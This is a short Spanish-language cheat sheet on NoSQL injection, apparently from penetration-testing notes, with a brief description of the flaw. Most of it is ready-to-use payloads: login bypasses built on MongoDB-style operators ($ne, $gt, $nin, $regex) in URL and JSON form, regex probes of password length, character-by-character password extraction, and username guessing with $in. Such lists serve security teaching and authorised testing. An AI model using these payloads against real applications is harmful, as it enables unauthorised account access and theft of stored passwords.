# NoSQL Injection
- [Descripcion de la vulnerabilidad](#descripcion-de-la-vulnerabilidad)
  - [Authentication Bypass](#authentication-bypass)
  - [Extraccion de logintud de los datos](#extraccion-de-logintud-de-los-datos)
  - [Extraccion de datos](#extraccion-de-datos)
  
# Descripcion de la vulnerabilidad

Las bases de datos NoSQL (Not Only SQL) son sistemas de gesti贸n de bases de datos que proporcionan un mecanismo para el almacenamiento y recuperaci贸n de datos que no sigue el modelo relacional tradicional utilizado en las bases de datos SQL

En una NoSQL Injection, un atacante explota la falta de validaci贸n o la validaci贸n insuficiente de los datos de entrada para ejecutar comandos no autorizados o para acceder, modificar o eliminar datos no autorizados en la base de datos NoSQL

En aplicaciones o entornos basados en JS como NodeJS podemos inyectar consultas usando condiciones falsas permitiendo que al pedir datos incorrectos obtengamos los datos existentes.

## Authentication Bypass

Bypass de autenticacion basico usando not equal ($ne) o greater ($gt)

```js
in DATA
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

## Extraccion de logintud de los datos

```js
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

## Extraccion de daos

```js
in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

Extract data with "in"

```js
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```



